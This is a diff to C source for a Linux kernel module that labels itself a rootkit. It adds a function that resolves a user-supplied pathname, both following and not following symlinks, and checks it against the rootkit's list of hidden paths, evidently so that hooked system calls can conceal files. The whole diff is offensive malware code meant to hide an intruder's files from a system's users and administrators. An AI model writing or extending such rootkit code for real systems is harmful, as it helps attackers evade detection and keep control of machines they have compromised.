@@ -5,6 +5,7 @@
 #include <asm/current.h>
 #include <linux/dcache.h>
 #include <linux/err.h>
+#include <linux/fcntl.h>
 #include <linux/fdtable.h>
 #include <linux/fs.h>
 #include <linux/gfp.h>
@@ -89,6 +90,50 @@ bool is_path_hidden(const path_t *const p_path)
     }
 
     return false;
+}
+
+bool is_pathname_hidden(const int i32_dfd, const char *const s_pathname, int i32_flags)
+{
+    bool b_ret = false; // Return value
+    int i_err  = 0;     // Error code
+    path_t path;        // Path structure
+
+    i32_flags |= AT_NO_AUTOMOUNT;
+
+    // First, check without following symlinks
+    i_err = user_path_at(i32_dfd, s_pathname,
+                         (i32_flags | AT_SYMLINK_NOFOLLOW) & ~AT_SYMLINK_FOLLOW, &path);
+
+    IF_U (i_err != 0) {
+        pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (not following symlinks)\n",
+               s_pathname, i_err);
+        return false;
+    }
+
+    b_ret = is_path_hidden(&path);
+
+    // Free the path structure
+    path_put(&path);
+
+    if (b_ret || !(i32_flags & AT_SYMLINK_FOLLOW) || (i32_flags & AT_SYMLINK_NOFOLLOW)) {
+        // Stop if we already know the path is hidden or we don't want to follow symlinks
+        return b_ret;
+    }
+
+    // Check again, this time following symlinks
+    i_err = user_path_at(i32_dfd, s_pathname, i32_flags, &path);
+
+    IF_U (i_err != 0) {
+        pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (following symlinks)\n",
+               s_pathname, i_err);
+        return false;
+    }
+
+    b_ret = is_path_hidden(&path);
+
+    path_put(&path);
+
+    return b_ret;
 }
 
 const file_t *fd_get_file(const int i32_fd)
